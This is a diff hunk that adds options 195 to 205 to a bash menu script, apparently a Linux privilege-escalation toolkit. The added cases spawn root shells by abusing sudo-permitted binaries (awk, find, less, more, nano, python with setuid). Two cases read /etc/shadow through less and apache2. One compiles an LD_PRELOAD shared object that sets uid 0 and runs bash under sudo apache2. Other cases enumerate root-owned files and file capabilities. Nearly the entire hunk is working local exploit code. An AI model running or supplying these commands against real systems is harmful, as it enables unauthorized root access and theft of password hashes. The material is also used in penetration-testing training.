@@ -862,6 +862,52 @@ while true; do
 	"194")
 		strace -o /dev/null /bin/sh
 	;;
+	"195")
+		awk 'BEGIN {system("/bin/bash")}'
+	;;
+	"196")
+		sudo find / -exec bash -i \
+	;;
+	"197")
+		find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}'
+	;;
+	"198")
+		echo "After less command, digit 'v' and then digit 'shell'"
+		read -p "Press enter to continue"
+		sudo less /etc/shadow
+	;;
+	"199")
+		echo "After running more, digit '!/bin/bash'"
+		read -p "Press enter to continue"
+		echo "test">test.txt
+		sudo more test.txt
+	;;
+	"200")
+		find / -user root -perm 400 -print 2>/dev/null
+	;;
+	"201")
+		echo "Digit /bin/sh and the Press Ctrk+T"
+		read -p "Press enter to continue"
+		sudo nano -s /bin/sh
+	;;
+	"202")
+		sudo apache2 -f /etc/shadow
+	;;
+	"203")
+		echo -ne "#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\n\nvoid _init(){\nunsetenv(\"LD_PRELOAD\");\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/bash\");\n}">testr00t.c
+		gcc -fPIC -shared -o /tmp/testr00t.so testr00t.c -nostartfiles & sudo LD_PRELOAD=/tmp/testr00t.so apache2
+	;;
+	"204")
+		getcap -r / 2>/dev/null
+	;;
+	"205")
+		echo "Digit a python full path listed in checking capabilities"
+		read -p "(example, /usr/bin/python2.6): " PYT
+		if [[ -f "$PYT" ]];
+		then
+			$PYT -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'
+		fi
+	;;
 	*)
 		echo "error, invalid choice"
 	;;
